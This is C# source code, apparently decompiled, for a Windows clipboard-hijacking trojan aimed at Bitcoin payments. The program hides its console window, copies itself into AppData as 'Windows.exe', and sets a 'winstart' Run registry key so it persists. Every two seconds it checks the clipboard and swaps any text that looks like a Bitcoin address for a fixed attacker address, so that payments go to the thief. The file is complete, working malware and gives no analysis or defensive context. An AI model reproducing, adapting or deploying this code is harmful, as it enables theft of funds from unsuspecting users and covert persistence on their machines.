using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ns0;

internal class Class0
{
	[CompilerGenerated]
	private sealed class Class1
	{
		public string string_0;

		internal void method_0()
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				if (registryKey.GetValue("winstart") == null)
				{
					registryKey.SetValue("winstart", Class0.string_0);
				}
				string_0 = Clipboard.GetText();
				if (string_0.StartsWith("1") && string_0.Length <= 34 && string_0.Length >= 25 && !string_0.Contains("0") && !string_0.Contains("O") && !string_0.Contains("I") && !string_0.Contains("l"))
				{
					if (bool_0)
					{
						Clipboard.SetText("3HZuyehQ9fqazyb2EQgGpjPFqVSEdvaGpE");
						bool_0 = false;
					}
					else
					{
						Clipboard.SetText("3HZuyehQ9fqazyb2EQgGpjPFqVSEdvaGpE");
						bool_0 = true;
					}
				}
				else if (string_0.StartsWith("3") && string_0.Length <= 34 && string_0.Length >= 25 && !string_0.Contains("0") && !string_0.Contains("O") && !string_0.Contains("I") && !string_0.Contains("l"))
				{
					if (bool_0)
					{
						Clipboard.SetText("3HZuyehQ9fqazyb2EQgGpjPFqVSEdvaGpE");
						bool_0 = false;
					}
					else
					{
						Clipboard.SetText("3HZuyehQ9fqazyb2EQgGpjPFqVSEdvaGpE");
						bool_0 = true;
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	private static bool bool_0 = false;

	private static string string_0 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Windows.exe");

	private const int int_0 = 0;

	private const int int_1 = 5;

	[DllImport("Kernel32")]
	private static extern IntPtr GetConsoleWindow();

	public static string smethod_0(int int_2)
	{
		char[] array = new char[62];
		array = "1234567890".ToCharArray();
		byte[] data = new byte[1];
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		rNGCryptoServiceProvider.GetNonZeroBytes(data);
		data = new byte[int_2];
		rNGCryptoServiceProvider.GetNonZeroBytes(data);
		StringBuilder stringBuilder = new StringBuilder(int_2);
		byte[] array2 = data;
		foreach (byte b in array2)
		{
			stringBuilder.Append(array[(int)b % array.Length]);
		}
		return stringBuilder.ToString();
	}

	private static void Main(string[] args)
	{
		ShowWindow(GetConsoleWindow(), 0);
		if (!File.Exists(string_0))
		{
			File.Copy(Application.get_ExecutablePath(), string_0);
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)?.SetValue("winstart", string_0);
		}
		else
		{
			Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)?.SetValue("winstart", string_0);
		}
		new Timer(smethod_1, null, 0, 2000);
		while (true)
		{
		}
	}

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr intptr_0, int int_2);

	private static void smethod_1(object object_0)
	{
		string string_0 = null;
		Thread thread = new Thread((ThreadStart)delegate
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				if (registryKey.GetValue("winstart") == null)
				{
					registryKey.SetValue("winstart", Class0.string_0);
				}
				string_0 = Clipboard.GetText();
				if (string_0.StartsWith("1") && string_0.Length <= 34 && string_0.Length >= 25 && !string_0.Contains("0") && !string_0.Contains("O") && !string_0.Contains("I") && !string_0.Contains("l"))
				{
					if (bool_0)
					{
						Clipboard.SetText("3HZuyehQ9fqazyb2EQgGpjPFqVSEdvaGpE");
						bool_0 = false;
					}
					else
					{
						Clipboard.SetText("3HZuyehQ9fqazyb2EQgGpjPFqVSEdvaGpE");
						bool_0 = true;
					}
				}
				else if (string_0.StartsWith("3") && string_0.Length <= 34 && string_0.Length >= 25 && !string_0.Contains("0") && !string_0.Contains("O") && !string_0.Contains("I") && !string_0.Contains("l"))
				{
					if (bool_0)
					{
						Clipboard.SetText("3HZuyehQ9fqazyb2EQgGpjPFqVSEdvaGpE");
						bool_0 = false;
					}
					else
					{
						Clipboard.SetText("3HZuyehQ9fqazyb2EQgGpjPFqVSEdvaGpE");
						bool_0 = true;
					}
				}
			}
			catch (Exception)
			{
			}
		});
		thread.SetApartmentState(ApartmentState.STA);
		thread.Start();
		thread.Join();
	}
}
